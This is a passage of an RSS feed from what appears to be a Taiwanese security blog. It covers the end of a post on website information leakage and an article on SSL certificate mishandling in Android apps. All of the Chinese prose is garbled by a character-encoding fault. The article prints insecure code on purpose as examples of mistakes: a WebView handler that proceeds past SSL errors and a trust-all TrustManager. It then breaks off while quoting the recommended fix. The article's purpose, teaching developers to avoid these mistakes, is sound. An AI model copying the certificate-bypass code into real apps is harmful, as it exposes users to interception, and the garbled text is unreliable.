&lt;p&gt;Âú®ÈÄôÊ¨°Ë≠∞È°åÊàëÂÄëÈóúÊ≥®‰∫ÜÂæàÂè§ËÄÅÁöÑË≥áË®äÊ¥©ÊºèÂïèÈ°åÔºå‰∏¶‰∏îÁôºÁèæÁõÆÂâçÂè∞ÁÅ£‰∏Ä‰∫õÁÜ±ÈñÄÁ∂≤Á´ô‰ªçÁÑ∂Â≠òÂú®ÈÄôÊ®£ÁöÑÂïèÈ°å„ÄÇË≥áË®äÊ¥©Êºè‰πüË®±‰∏çÊòØ‰∏Ä‰ª∂ÂæàÂö¥ÈáçÁöÑ‰∫ãÊÉÖÔºå‰ΩÜÂæÄÂæÄËÉΩÊøÄËµ∑Èß≠ÂÆ¢È´òÊº≤ÁöÑÊÉÖÁ∑íÔºåÈß≠ÂÆ¢ÊúÉË™çÁÇ∫‰∏ÄÂÄãÁ∂≤Á´ôÈÄ£ÊúÄÊúÄÊúÄÂü∫Êú¨ÁöÑË≥áÊñô‰øùË≠∑ÈÉΩÊ≤íÊúâÂÅöÂà∞Ôºå‰∏ÄÂÆöÊúÉÂ≠òÂú®ÂÖ∂‰ªñË≥áÂÆâÂïèÈ°åÔºåÈÄ≤ËÄåÈÄ≤Ë°åÊõ¥Â§ßÈáèÁöÑÊîªÊìäË°åÁÇ∫„ÄÇËÄå‰∫ãÂØ¶‰∏äÔºåÊàëÂÄë‰πüÂæûÂØ¶‰æãË≠âÊòé‰∫ÜÂÖ∂ÂØ¶Ë≥áË®äÊ¥©ÊºèÂèØ‰ª•ÂæàÂö¥ÈáçÔºåÂ∏åÊúõÁ∂≤Á´ôÊèê‰æõËÄÖËÉΩÂ§†Ê≥®ÈáçÈÄôÂÄãÁ∞°ÂñÆÂèØËß£Ê±∫‰∏îÈáçË¶ÅÁöÑË≠∞È°å„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊàëÂÄë‰πüÊèêÂà∞‰∫ÜÈß≠ÂÆ¢ÈÄèÈÅéÂπ≥Â∏∏Â§ßÈáèÁöÑË≥áÊñôÊî∂ÈõÜÔºåÂú®ÈúÄË¶ÅÁöÑÊôÇÂÄôËÉΩÂø´ÈÄüÊâæÂà∞ÁõÆÊ®ô‰∏¶‰∏îÂ§ßÁØÑÂúçÊîªÊìä„ÄÇÈÄôÂÖ∂‰∏≠Âèà‰ª•Áâ©ËÅØÁ∂≤ÁöÑÁî®Êà∂ÂΩ±ÈüøÊúÄÂ§ö„ÄÇÈù¢Â∞çÈÄôÊ®£ÁöÑË≠∞È°åÔºåÊàëÂÄëÂª∫Ë≠∞Èô§‰∫ÜÈÅ©Áï∂ÁöÑÈö±Ëóè(ÂÅΩÈÄ†)‰∏ªÊ©üÁâàÊú¨Ë≥áË®ä‰ª•ÈÅøÂÖçÂá∫Áèæ 0-Day ÊôÇÊàêÁÇ∫È¶ñË¶ÅÊîªÊìäÁõÆÊ®ô„ÄÇÊàëÂÄë‰πüÊèêÂÄ°Ë¶ÅÂ∞çËá™Â∑±ÁöÑÊúçÂãôÂÅöÊôÆÊü•Ôºå‰∫ÜËß£Ëá™Â∑±Âà∞Â∫ïÂ∞çÂ§ñÈñãÂïü‰∫Ü‰ªÄÈ∫ºÊúçÂãôÔºå‰ª•ÂèäÈóúÊ≥®Ëá™Â∑±‰ΩøÁî®ÁöÑ&lt;a href=&quot;http://devco.re/blog/2014/03/14/3rd-party-software-security-issues/&quot;&gt;Á¨¨‰∏âÊñπÂ•ó‰ª∂&lt;/a&gt;ÊòØÂê¶ÊúâÂÆâÂÖ®Êõ¥Êñ∞„ÄÇ&lt;/p&gt;

&lt;p&gt;Â∏åÊúõÊòéÂπ¥‰∏çÈúÄË¶ÅÂÜçÊúâ‰∏ÄÁØá„Äé‰æùËàäÊ≤íÊîπËÆäÁöÑË≥áË®äÊ¥©Êºè„ÄèÔºÅÂ§ßÂÆ∂Âø´ÈªûÊ≥®ÊÑèÈÄô‰ª∂Á∞°ÂñÆÁöÑ‰∫ãÊÉÖÂêßÔºÅ&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014/</link>
                <guid>https://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014</guid>
                <pubDate>Tue, 26 Aug 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ÊâãÊ©üÊáâÁî®Á®ãÂºèÈñãÁôº‰∏äË¢´ÂøΩÁï•ÁöÑ SSL ËôïÁêÜ</title>
                <description>&lt;p&gt;Âú®Á∂≤Ë∑Ø‰∏äÂÇ≥Ëº∏ÊïèÊÑüË≥áË®äÊôÇÔºåÈÄöÂ∏∏ÊúÉ‰ΩøÁî® HTTPS ÂçîÂÆöÔºåËÆìÂÆ¢Êà∂Á´ØËàá‰º∫ÊúçÂô®Á´ØÂ∞çË≥áÊñôÈÄ≤Ë°å SSL Âä†ÂØÜËôïÁêÜÔºå‰ª•Èôç‰ΩéË≥áÊñôÂú®ÂÇ≥Ëº∏ÈÅéÁ®ã‰∏≠Ë¢´Áõ£ËÅΩÊàñ‰∏≠Èñì‰∫∫ÊîªÊìäÁöÑÈ¢®Èö™„ÄÇHTTPS ÁöÑÈáçË¶ÅÊÄßÈÄêÊº∏Ë¢´ÈáçË¶ñÔºåGoogle Èô§‰∫ÜÈ†êË®≠ÈñãÂïü HTTPS ‰πãÂ§ñÔºåÊú™‰æÜÊõ¥ÊúÉÂ∞á &lt;a href=&quot;http://googlewebmastercentral.blogspot.tw/2014/08/https-as-ranking-signal.html&quot;&gt;HTTPS ÁöÑÁ∂≤Á´ôÊêúÂ∞ãÊéíÂêçÂä†ÂàÜ&lt;/a&gt;„ÄÇ‰ΩÜÁÇ∫‰∫ÜÁ¢∫‰øùÂÇ≥Ëº∏ÁöÑÂÆâÂÖ®ÔºåÈÅéÁ®ã‰∏≠ÂÆ¢Êà∂Á´ØÊúÉÊ†∏Â∞ç‰º∫ÊúçÂô®ÁöÑÊÜëË≠âÈèà (certificate chain) ÊòØÂê¶ÊúâÊïàÔºåËã•Âà§ÂÆöÁÇ∫ÁÑ°ÊïàÊôÇÊúÉ‰ΩúÂá∫Ë≠¶Âëä„ÄÇ(Ë©≥Ë¶ã&lt;a href=&quot;http://en.wikipedia.org/wiki/Secure_Sockets_Layer&quot;&gt;Wikipedia&lt;/a&gt;)&lt;/p&gt;

&lt;!-- more --&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140815/desktop_browser_insecure_warning.png&quot; alt=&quot;Desktop Ë≠¶ÂëäÂúñ&quot; /&gt;
ËÄåÂú®ÊâãÊ©üÊáâÁî®Á®ãÂºè‰∏ä HTTPS ÂêåÊ®£ÈáçË¶ÅÔºå‰æãÂ¶ÇÁ∂≤Ë∑ØÈäÄË°å„ÄÅÁ∑ö‰∏äË≥ºÁâ©Á≠â„ÄÇÁ≥ªÁµ±ÂêåÊ®£ÊúÉÂÅöÊÜëË≠âÊ†∏Â∞çÔºå‰ΩÜÂ∞çË¢´Âà§ÂÆöÁÇ∫ÁÑ°ÊïàÁöÑÊÜëË≠âÂ∞±ÈúÄË¶ÅÈñãÁôºËÄÖ‰ΩúÂá∫È°çÂ§ñÁöÑËôïÁêÜ‰∫Ü„ÄÇË®±Â§öÊâãÊ©üÊáâÁî®Á®ãÂºèÈñãÁôºÂïÜÂú®ÈÄôÂÄãÈÉ®ÂàÜ‰∏¶Ê≤íÊúâÂ¶•ÂñÑËôïÁêÜÂ•ΩÔºå‰ª•‰∏ãÊàëÂÄëÂ∞±ÂπæÂÄãÂ∏∏Ë¶ãÁöÑÊàêÂõ†ÂÅöÂü∫Êú¨ÁöÑÊé¢Ë®é„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÊúÉË¢´Á≥ªÁµ±Âà§ÂÆöÁÇ∫ÁÑ°ÊïàÁöÑÂ∏∏Ë¶ãÊàêÂõ†&quot;&gt;ÊúÉË¢´Á≥ªÁµ±Âà§ÂÆöÁÇ∫ÁÑ°ÊïàÁöÑÂ∏∏Ë¶ãÊàêÂõ†Ôºü&lt;/h3&gt;
&lt;p&gt;Âú®Êé¢Ë®éË©≤Â¶Ç‰ΩïËôïÁêÜÈÄôÂÄãÂïèÈ°å‰πãÂâçÔºåÈÄôË£°ÂÖàÂàóÂá∫‰∏Ä‰∫õÊúâÂèØËÉΩË¢´Á≥ªÁµ±Âà§ÂÆöÊàêÁÑ°ÊïàÊÜëË≠âÁöÑÊàêÂõ†„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;1-Á≥ªÁµ±ÊîØÊè¥ÂïèÈ°å-&quot;&gt;1. Á≥ªÁµ±ÊîØÊè¥ÂïèÈ°å &lt;sup id=&quot;fnref:note1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/h4&gt;
&lt;p&gt;Âú® Android 2.2 Âèä‰πãÂâçÁöÑÁâàÊú¨ÔºåÂ∞ç SSL ÁöÑÊîØÊè¥‰∏äÂ≠òÂú®Ëëó‰∏Ä‰∫õÂïèÈ°åÔºåÂÉèÊòØ &lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=12908&quot;&gt;SNI&lt;/a&gt; Âíå &lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=26542&quot;&gt;Multiple Chain&lt;/a&gt;„ÄÇËÄå Android ‰∏ä‰∏çÊé•ÂèóÁº∫Â∞ë‰∏≠Áπº CA ÊÜëË≠âÁöÑÊÜëË≠âÈèàÔºå‰æãÂ¶ÇÔºö&lt;a href=&quot;https://egov.uscis.gov/&quot;&gt;https://egov.uscis.gov/&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;2-Áõ∏ÈóúÊÜëË≠âÊú™Ë¢´È†êËºâÂà∞Á≥ªÁµ±‰∏≠&quot;&gt;2. Áõ∏ÈóúÊÜëË≠âÊú™Ë¢´È†êËºâÂà∞Á≥ªÁµ±‰∏≠&lt;/h4&gt;
&lt;p&gt;‰ª• GCA Á∞ΩÁôºÁöÑ SSL ÊÜëË≠âÁÇ∫‰æãÔºåÂú® Windows ‰∏äË¢´Âà§ÂÆöÁÇ∫ÊúâÊïàÔºå‰ΩÜÂú® iOS Á≥ªÁµ±‰∏äÂçªÂõ†ÁÇ∫ CA ‰∏çÂú®Á≥ªÁµ±ÁöÑÈ†êËºâÊ∏ÖÂñÆ‰∏≠ËÄåË¢´Âà§ÂÆöÁÇ∫ÁÑ°Êïà„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140815/windows_recognize_gca.png&quot; alt=&quot;Windows&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20140815/iphone_unknown_ca.png&quot; alt=&quot;iPhone&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;3-‰ΩøÁî®Ëá™Ë°åÁ∞ΩÁôºÁöÑÊÜëË≠â&quot;&gt;3. ‰ΩøÁî®Ëá™Ë°åÁ∞ΩÁôºÁöÑÊÜëË≠â&lt;/h4&gt;
&lt;p&gt;ÈÄôÁ®ÆÊÉÖÊ≥ÅÂ∏∏Âá∫ÁèæÂú®ÊáâÁî®Á®ãÂºèÈñãÁôºÈöéÊÆµÁöÑÂÖßÈÉ®Ê∏¨Ë©¶Áí∞Â¢É‰∏≠ÔºåÁî±ÊñºÊòØÂÖßÈÉ®Ê∏¨Ë©¶Áí∞Â¢É‰∏ÄËà¨ÈÉΩ‰∏çÊúÉËä±Èå¢ÂéªÁî≥Ë´ãÊÜëË≠â„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;4-ÈÄ£Á∑öË¢´‰∏≠Èñì‰∫∫mitmÊîªÊìä&quot;&gt;4. ÈÄ£Á∑öË¢´‰∏≠Èñì‰∫∫(MITM)ÊîªÊìä&lt;/h4&gt;
&lt;p&gt;Áï∂ÈÄ£Á∑öË¢´ MITM ÊîªÊìäÊôÇÔºå‰ΩøÁî®ËÄÖÂéüÊú¨ÁöÑÈÄ£Á∑öÁõÆÁöÑÂú∞ÊúÉË¢´Â∞éÂà∞ÊîªÊìäËÄÖÁöÑË®≠ÂÇô‰∏äÔºåÊ≠§ÊôÇ‰º∫ÊúçÂô®ÊÜëË≠â‰πüÊúÉË¢´Âèñ‰ª£ÊàêÊîªÊìäËÄÖËá™Ë°åÁ∞ΩÁôºÁöÑÊÜëË≠âÔºåÈÄ†ÊàêÂéüÊú¨Ê≠£Â∏∏ÁöÑÈÄ£Á∑öÂá∫ÁèæÁï∞Â∏∏„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÈñãÁôºËÄÖË©≤Â¶Ç‰ΩïËôïÁêÜ&quot;&gt;ÈñãÁôºËÄÖË©≤Â¶Ç‰ΩïËôïÁêÜÔºü&lt;/h3&gt;

&lt;p&gt;ÁêÜÊÉ≥ÊÉÖÊ≥Å‰∏ãÔºåÂÆ¢Êà∂Á´ØÁöÑÊîØÊè¥Â∫¶ÂÖÖË∂≥Ôºå‰º∫ÊúçÂô®ÊÜëË≠âÈèàÁöÑ‰æÜÊ∫êÂèäË®≠ÂÆöÊ≠£Á¢∫ÔºåÂè™ÈúÄ‰ΩøÁî®Á≥ªÁµ±ÂéüÊúâÁöÑÊñπÂºèÂéªÊ™¢Êü•ÊÜëË≠âÂç≥ÂèØÈÅîÂà∞ÂÆâÂÖ®ÊïàÊûú„ÄÇ‰ΩÜËã•ÈùûÂæóË¶ÅÁõ∏ÂÆπ‰ΩéÁâàÊú¨Á≥ªÁµ±ÊàñÊòØËá™Ë°åÁ∞ΩÁôºÊÜëË≠âÁöÑÊôÇÂÄôÔºåÂ∞±ÂæóËá™Ë°åÂÅöÈ°çÂ§ñÁöÑÊ™¢Êü•„ÄÇ&lt;/p&gt;

&lt;p&gt;Âú®ËôïÁêÜÊñπÂºè‰∏äÔºåÊôÆÈÅçÊòØ‰ΩøÁî®ÊÜëË≠âÁ∂ÅÂÆö (certificate pinning) ÁöÑÊñπÂºèÔºåÊääÈúÄË¶ÅÊØîÂ∞çÁöÑÊÜëË≠âÈ†êÂÖàÂ≠òÊîæÂú®ÊáâÁî®Á®ãÂºèË£°ÔºåÂæÖË¶ÅÈÄ≤Ë°å SSL Handshake ÁöÑÊôÇÂÄôÂÜçËàá‰º∫ÊúçÂô®ÁöÑÊÜëË≠âÂÅöÊØîÂ∞ç„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂèØÊòØÂú®ÂØ¶Âãô‰∏äÔºåÂ§ßÂ§öÈñãÁôº‰∫∫Âì°Êé°Áî®Ê∂àÊ•µÁöÑÊñπÊ≥ïÔºåÊääÈåØË™§Ë≠¶ÂëäÁï•ÈÅéËÆìÈÄ£Á∑öÁπºÁ∫åÈÄ≤Ë°åÔºå‰ΩøÂæóÊú¨‰æÜ‰ΩøÁî® SSL Âä†ÂØÜÈÄ£Á∑öÂ∏∂‰æÜÁöÑÂÆâÂÖ®ÊÄßÂΩ¢ÂêåËôõË®≠„ÄÇÊìö 2012 Âπ¥ &lt;a href=&quot;http://android-ssl.org/files/p50-fahl.pdf&quot;&gt;Why Eve and Mallory Love Android: An Analysis of SSL (In)Security on Android&lt;/a&gt; ÈÄôÁØáË´ñÊñáÊåáÂá∫ÔºåÂú® Google Play ‰∏ä 13500 ÂÄãÂÖçË≤ªÁÜ±ÈñÄÊáâÁî®Á®ãÂºèÁï∂‰∏≠ÔºåÂÖ±Êúâ 1074 ÂÄã (8%) ÊáâÁî®Á®ãÂºèÂõ†ÈåØË™§ÁöÑ SSL ËôïÁêÜËÄåÂ∞éËá¥‰ΩøÁî®ËÄÖÈô∑ÂÖ• MITM ÊîªÊìäÁöÑÈ¢®Èö™‰∏≠„ÄÇ&lt;/p&gt;

&lt;p&gt;‰∏ãÈù¢ÊàëÂÄëÊï¥ÁêÜ‰∫Ü‰∏Ä‰∫õÂú®ÊâãÊ©üÊáâÁî®ÈñãÁôº‰∏äÔºåÂ∏∏Ë¶ãÁöÑ SSL ËôïÁêÜÈåØË™§Ôºå‰ª•ÂèäÂÖ∂Â∞çÊáâÈÅ©Áï∂ÁöÑËôïÁêÜÊñπÊ≥ï„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;android-ÈåØË™§ËôïÁêÜÊÉÖÊ≥Å1&quot;&gt;Android ÈåØË™§ËôïÁêÜÊÉÖÊ≥Å1&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onReceivedSslError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;WebView&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SslErrorHandler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SslError&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;proceed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Áï∂ÈÄèÈÅé WebView ÂÖÉ‰ª∂Ë®™Âïè HTTPS Á∂≤Á´ôÁôºÁîü SSL ÈåØË™§ÊôÇÔºåÊúÉËß∏Áôº onReceivedSslError ÈÄôÂÄãÂáΩÊï∏„ÄÇÊ†πÊìöÂÆòÊñπÊñá‰ª∂ÊåáÂá∫ÔºåÂèØËóâÁî±Âü∑Ë°å handler.proceed() ÊàñÊòØ handler.cancel() ‰æÜÊ±∫ÂÆöÊòØÂê¶ËÆìÈÄ£Á∑öÁπºÁ∫åÈÄ≤Ë°å„ÄÇÂú®‰∏çË¶ÜÂØ´ÈÄôÂáΩÊï∏ÁöÑÊÉÖÊ≥Å‰∏ãÈ†êË®≠ÊúÉÂü∑Ë°å handler.cancel()„ÄÇËÄå‰∏äÈù¢ÁöÑÂÅöÊ≥ïÂçªËÆìÁï∞Â∏∏ÁöÑÈÄ£Á∑öÁπºÁ∫åÈÄ≤Ë°å‰∫Ü„ÄÇ&lt;/p&gt;

&lt;p&gt;ËºÉÁÇ∫ÊÅ∞Áï∂ÁöÑÂÅöÊ≥ïÊòØ‰ΩøÁî® handler.cancel() ËÆìÈÄ£Á∑öÁµÇÊ≠¢ÔºåÊàñÊòØÈôêÂà∂Âú®ÈñãÁôºÈöéÊÆµÊâçÂü∑Ë°å handler.proceed()„ÄÇÂÉè &lt;a href=&quot;https://github.com/apache/cordova-android/blob/3.5.1/framework/src/org/apache/cordova/CordovaWebViewClient.java#L298&quot;&gt;Apache Coradova&lt;/a&gt; Âíå &lt;a href=&quot;https://github.com/facebook/facebook-android-sdk/blob/sdk-version-3.15.0/facebook/src/com/facebook/widget/WebDialog.java#L420&quot;&gt;Facebook Android SDK&lt;/a&gt; ÁöÜÊúâÂ∞çÈÄôÈÉ®ÂàÜÂÅöÊéßÁÆ°„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;android-ÈåØË™§ËôïÁêÜÊÉÖÊ≥Å2&quot;&gt;Android ÈåØË™§ËôïÁêÜÊÉÖÊ≥Å2&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nc&quot;&gt;TrustManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trustAllManager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TrustManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;X509TrustManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checkClientTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;X509Certificate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checkServerTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;X509Certificate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;X509Certificate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getAcceptedIssuers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;nc&quot;&gt;SSLContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sslContext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SSLContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TLS&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sslContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trustAllManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Êú¨Áî®‰æÜÊ™¢Êü•‰º∫ÊúçÂô®ÊÜëË≠âÁöÑ checkServerTrusted Ë¢´ÁïôÁ©∫ÔºåÂ∞éËá¥Ë≠¶ÂëäË¢´Áï•ÈÅé„ÄÇGoogle Âª∫Ë≠∞‰∏çË¶ÅËá™Ë°åÂØ¶‰Ωú TrustManagerÔºåËÄåÊòØÊääÊÜëË≠âÊîæÂà∞ KeyStoreÔºåÂÜçÊää KeyStore ÊîæÂà∞ TrustManagerFactoryÔºåÊúÄÂæåÂæû TrustManagerFactory Áî¢Âá∫Áõ∏ÈóúÁöÑ TrustManagerÔºåÈñãÁôºÊñá‰ª∂‰∏≠ÊúâÊèê‰æõËôïÁêÜÁöÑ&lt;a href=&quot;https://developer.android.com/training/articles/security-ssl.html#UnknownCa&quot;&gt;ÁØÑ‰æã&lt;/a&gt;„ÄÇOWASP ÁöÑ WIKI ‰∏ä‰πüÊúâÊèê‰æõËá™Ë°åÂØ¶‰Ωú TrustManager ÂÅö certificate pinning ÁöÑ&lt;a href=&quot;https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning#Android&quot;&gt;ÁØÑ‰æã&lt;/a&gt;„ÄÇ&lt;sup id=&quot;fnref:note2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;

&lt;p&gt;‰∏ãÈù¢ÁØÄÈåÑ Android ÂÆòÊñπÊñá‰ª∂‰∏äÁöÑÁØÑ‰æãÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nc&quot;&gt;KeyStore&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyStore&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;...;&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;algorithm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TrustManagerFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDefaultAlgorithm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;TrustManagerFactory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TrustManagerFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;algorithm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tmf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keyStore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

